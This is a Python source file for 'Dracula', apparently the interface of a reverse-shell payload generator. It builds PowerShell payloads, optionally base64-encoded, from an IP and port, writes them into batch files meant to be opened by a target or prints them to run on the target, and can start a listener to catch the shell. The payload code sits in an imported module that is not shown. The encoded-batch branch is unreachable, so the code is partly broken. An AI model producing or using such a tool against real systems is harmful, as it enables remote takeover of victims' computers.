import os
import argparse
import Main.dracula_main as main
import Main.dracula_listener as listener


#COLORS INITIALIZE
RED = "\033[0;31m"
GREEN = "\033[0;32m"
BV = "\033[38;5;57m"
CYAN = "\033[38;5;69m"
RESET = "\033[0m"

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    print('\n')
    banner = [
        "     _____                       _       ",
        "    |  __ \\                     | |      ",
        "    | |  | |_.__ __._  ___._   _| | __._ ",
        "    | |  | |  __/ _  |/ __| | | | |/ _  |",
        "    | |__| | | | (_| | (__| |_| | | (_| |",
        "    |_____/|_|  \\__._|\\___|\\__._|_|\\__._|"
    ]
    colors = [57, 63, 69, 75, 81, 87]
    for i, line in enumerate(banner):
        txt_color = colors[i % len(colors)]
        print(''.join(f'\033[38;5;{txt_color}m{char}' for char in line))
    print("[-]  by ch37\n\033[0m[-] Use -h for help")

clear_screen()
print_banner()

payload_type = None

while True:
    dracula_cm = input(f"{BV}Dracula >> {RESET}").split()
    if not dracula_cm:
        continue

    parser = argparse.ArgumentParser(description="Generate a reverse shell payload in form of a batch file.")
    parser.add_argument("-PORT", "--port", help="Port number for the reverse shell")
    parser.add_argument("-OUTFILE", "--output", help="Output file name")
    parser.add_argument("-CONNECT", "--connect", action="store_true", help="Connects with the target if the target opens the file")
    parser.add_argument("-IP", "--ip", help="Specify the IP address of the target")
    parser.add_argument("-ENCODED", "--encoded", action="store_true", help="generates payload in base64")

    args = parser.parse_args(dracula_cm)
    powershell_script_batch = main.generate_payload_ps(args.ip, args.port, args.output)
    powershell_script_batch_encoded = main.generate_payload_ps_encoded(args.ip, args.port, args.output)
    powershell_script = main.generate_payload_ps_text(args.ip, args.port)
    powershell_script_encoded = main.generate_payload_ps_text_encoded(args.ip, args.port)

    try:
        if args.ip and args.port and args.output:
            with open(args.output, "w") as f:
                f.write(powershell_script_batch)
                print(f"\n{GREEN}SUCCESS!!! {RESET}CREATED {args.output} ")
        elif args.ip and args.port and args.output and args.encoded:
            with open(args.output, "w") as f:
                f.write(powershell_script_batch_encoded)
                print(f"\n{GREEN}SUCCESS!!! {RESET}CREATED {args.output} ")
        elif args.ip and args.port and args.encoded:
            print("ENCODED PAYLOAD GENERATED, RUN ON TARGET SYSTEM: ")
            print(f"\n{GREEN} {powershell_script_encoded}")
        elif args.ip and args.port:
            print("PAYLOAD GENERATED, RUN ON TARGET SYSTEM: ")
            print(f"\n{GREEN} {powershell_script}")
    except Exception as e:
        print(f"{RED}An error occurred: {e}{RESET}")

    if args.connect and args.port and args.ip:
        print(f"{BV}Starting listener on {args.ip}:{args.port}...")
        listener.listener(args.ip, args.port)
